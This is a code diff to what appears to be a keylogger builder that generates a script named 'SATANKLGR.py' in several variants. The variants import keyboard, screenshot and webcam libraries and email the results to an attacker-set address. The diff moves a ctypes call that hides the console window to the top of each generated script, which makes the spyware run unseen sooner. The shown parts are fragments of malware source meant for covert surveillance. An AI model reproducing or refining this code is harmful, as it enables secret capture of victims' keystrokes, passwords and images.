@@ -100,6 +100,8 @@ if response == 'I AGREE WITH RULES':
             try:
                 with open("SATANKLGR.py", 'w') as f:
                     f.write(f'''import smtplib
+import ctypes
+ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
 import imghdr
 from email.message import EmailMessage
 import pyautogui
@@ -110,9 +112,6 @@ import os
 from cv2 import *
 from datetime import datetime
 import threading
-import ctypes
-
-ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
 
 Sender_Email = '''+f'"{email1}"'+f'''
 Reciever_Email = Sender_Email
@@ -198,13 +197,12 @@ keylogger.screenshot()
             try:
                 with open ('SATANKLGR.py', 'w') as f:
                     f.write(f'''import smtplib
+import ctypes
+ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
 import threading
 from threading import Timer
 from datetime import datetime
 import keyboard
-import ctypes
-
-ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
 
 Sender_Email = '''+f'"{email1}"'+f'''
 Reciever_Email = Sender_Email
@@ -262,7 +260,8 @@ keylogger.run()
             try:
                 with open ('SATANKLGR.py', 'w') as f:
                     f.write(f'''import smtplib
-import imghdr
+import ctypes
+ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
 from email.message import EmailMessage
 import cv2
 import os
@@ -270,9 +269,7 @@ import keyboard
 from datetime import datetime
 import threading
 from multiprocessing import Process
-import ctypes
-
-ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
+import imghdr
 
 Sender_Email = '''+f'"{email1}"'+f'''
 Reciever_Email = Sender_Email
@@ -375,6 +372,8 @@ if __name__ == '__main__':
             try:
                 with open("SATANKLGR.py", 'w') as f:
                     f.write(f'''import smtplib
+import ctypes
+ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
 import imghdr
 from email.message import EmailMessage
 import pyautogui
@@ -385,9 +384,6 @@ import keyboard
 from datetime import datetime
 import threading
 from multiprocessing import Process
-import ctypes
-
-ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
 
 Sender_Email = '''+f'"{email1}"'+f'''
 Reciever_Email = Sender_Email
@@ -518,14 +514,13 @@ if __name__ == '__main__':
             try:
                 with open("SATANKLGR.py", 'w') as f:
                     f.write(f'''import smtplib
-import imghdr
+import ctypes
+ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
 from email.message import EmailMessage
 import pyautogui
 import os
 import threading
-import ctypes
-
-ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
+import imghdr
 
 Sender_Email = '''+f'"{email1}"'+f'''
 Reciever_Email = Sender_Email
@@ -576,17 +571,16 @@ keylogger.screenshot()
             try:
                 with open ("SATANKLGR.py", 'w') as f:
                     f.write(f'''import smtplib
-import imghdr
+import ctypes
+ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
 from email.message import EmailMessage
 import pyautogui
 import os
 import keyboard
 import threading
 from multiprocessing import Process
-import ctypes
+import imghdr
 from datetime import datetime
-
-ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
 
 Sender_Email = '''+f'"{email1}"'+f'''
 Reciever_Email = Sender_Email
@@ -681,14 +675,13 @@ if __name__ == '__main__':
             try:
                 with open("SATANKLGR.py", 'w') as f:
                     f.write(f'''import smtplib
-import imghdr
+import ctypes
+ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
 from email.message import EmailMessage
 import os
 import cv2
 import threading
-import ctypes
-
-ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
+import imghdr
 
 Sender_Email = '''+f'"{email1}"'+f'''
 Reciever_Email = Sender_Email
